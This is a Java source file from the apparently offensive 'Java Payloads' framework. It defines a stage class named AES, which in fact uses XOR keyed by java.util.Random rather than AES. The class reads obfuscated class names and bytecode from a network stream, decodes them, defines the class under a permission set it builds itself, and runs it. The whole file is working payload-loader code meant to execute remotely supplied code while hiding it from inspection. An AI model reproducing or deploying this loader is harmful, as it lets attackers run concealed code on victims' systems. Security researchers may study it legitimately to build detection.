/*
 * Java Payloads.
 * 
 * Copyright (c) 2010, 2011 Michael 'mihi' Schierl.
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */
package javapayload.stage;

import java.io.DataInputStream;
import java.io.OutputStream;
import java.net.URL;
import java.security.CodeSource;
import java.security.Permission;
import java.security.Permissions;
import java.security.ProtectionDomain;
import java.security.cert.Certificate;
import java.util.Random;

public class AES extends ClassLoader implements Stage {

	public void start(DataInputStream in, OutputStream out, String[] parameters) throws Exception {
		Random r = new Random(in.readLong());
		byte[] stringBytes = new byte[(short) (in.readShort() ^ r.nextInt(65536))];
		in.readFully(stringBytes);
		char[] stringChars = new char[stringBytes.length];
		for (int i = 0; i < stringChars.length; i++) {
			stringChars[i] = (char) ((stringBytes[i] ^ r.nextInt(256)) & 0xff);
		}
		String[] strings = new String(stringChars).split(String.valueOf(','));
		Class[] classes = new Class[strings.length];
		Object[] objs = new Object[strings.length];
		for (int i = 2; i < strings.length; i++) {
			classes[i] = Class.forName(strings[i]);
			if (i != 4)
				objs[i] = classes[i].newInstance();
		}
		final Permissions permissions = (Permissions) objs[2];
		permissions.add((Permission) objs[3]);
		final ProtectionDomain pd = new ProtectionDomain(new CodeSource(new URL(strings[0]), new Certificate[0]), permissions);
		byte[] classBytes = new byte[(short) (in.readShort() ^ r.nextInt(65536))];
		in.readFully(classBytes);
		for (int i = 0; i < classBytes.length; i++) {
			classBytes[i] ^= r.nextInt(256);
		}
		defineClass(null, classBytes, 0, classBytes.length, pd)
				.getMethod(strings[1], new Class[] { classes[4] })
				.invoke(null, (Object[]) new Object[][] { { in, out, parameters, pd, this, r } });
	}
}
